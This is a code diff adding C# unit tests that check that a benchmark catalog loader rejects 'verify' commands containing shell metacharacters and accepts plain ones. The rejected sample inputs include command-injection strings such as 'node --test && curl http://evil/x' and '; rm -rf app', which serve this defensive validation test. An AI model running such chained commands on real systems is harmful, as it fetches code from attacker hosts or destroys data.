@@ -204,4 +204,36 @@ public sealed class BenchmarkCatalogTests : IDisposable
         var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("missing"));
         Assert.Contains("no existe", error.Message);
     }
+
+    [Theory]
+    [InlineData("node --test && curl http://evil/x")]
+    [InlineData("node --test || echo boom")]
+    [InlineData("node --test ; rm -rf app")]
+    [InlineData("node --test | more")]
+    [InlineData("node --test > out.txt")]
+    [InlineData("node --test < input.txt")]
+    [InlineData("$(node --test)")]
+    [InlineData("node `test`")]
+    [InlineData("node --test\nrm -rf app")]
+    public void Load_RejectsShellMetacharactersInVerify(string command)
+    {
+        var json = ValidSuite.Replace("node --test", command.Replace("\\", "\\\\").Replace("\n", "\\n"));
+        WriteSuite("bad", json);
+        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
+        Assert.Contains("verify", error.Message);
+        Assert.Contains("no está permitido", error.Message);
+    }
+
+    [Theory]
+    [InlineData("node --test")]
+    [InlineData("dotnet run --project tests")]
+    [InlineData("python -m pytest")]
+    [InlineData("npm run build -- --silent")]
+    public void Load_AcceptsPlainVerifyCommands(string command)
+    {
+        var json = ValidSuite.Replace("node --test", command);
+        WriteSuite("ok", json);
+        var suite = Catalog().Load("ok");
+        Assert.Equal(command, suite.Tests[0].VerifyCommand);
+    }
 }
